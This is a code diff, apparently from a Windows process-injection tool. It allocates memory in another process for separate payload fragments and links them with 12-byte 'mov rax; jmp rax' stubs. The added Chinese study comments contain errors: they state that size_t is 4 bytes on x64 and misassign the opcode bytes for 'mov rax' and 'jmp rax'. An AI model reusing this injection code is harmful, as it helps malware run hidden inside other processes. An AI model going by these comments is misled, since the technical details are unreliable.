@@ -196,10 +196,25 @@ int main() {
 
   // --- Allocate remote memory for each part (random locations by passing NULL) ---
   std::vector<LPVOID> positions(num_parts);
+  // unsigned int本來是"無符號4bytes容器", 即只有正數
+  // size_t則是"隨OS變動的unsigned int",
+  // x32 OS中它是2^32, 即4bytes
+  // x64 OS中它是2^32, 即4bytes
   const size_t jump_size = 12;  // For x64: mov rax, addr (10 bytes) + jmp rax (2 bytes)
-  for (size_t i = 0; i < num_parts; ++i) {
+  for (size_t i=0; i<num_parts; ++i) {
     size_t alloc_size = parts[i].size();
-    if (i < num_parts - 1) alloc_size += jump_size;
+    if (i < num_parts-1) 
+    {
+      // alloc_size是用來裝某一part的payload的
+
+      // jump_size是用來裝"固定的jump to 某個memory地址的指令的",
+      // mov rax, <8-byte address>, 共10bytes
+      // mov(匯編碼48, 1bytes) rax(寄存器名稱, 匯編碼B8, 1bytes), <8-byte address>(x64的OSmem地址8bytes)
+      // jump rax, 共2bytes
+      // jump(匯編碼FF, 1bytes) rax(寄存器名稱, 匯編碼B8, 1bytes)
+      // 所以jump_size共12bytes, 預鬆空間可設15bytes
+      alloc_size += jump_size;
+    };
     positions[i] = new_VirtualAllocEx(hProcess, NULL, alloc_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (positions[i] == NULL) {
       std::cout << "[-] Failed to allocate remote memory for part " << i << std::endl;
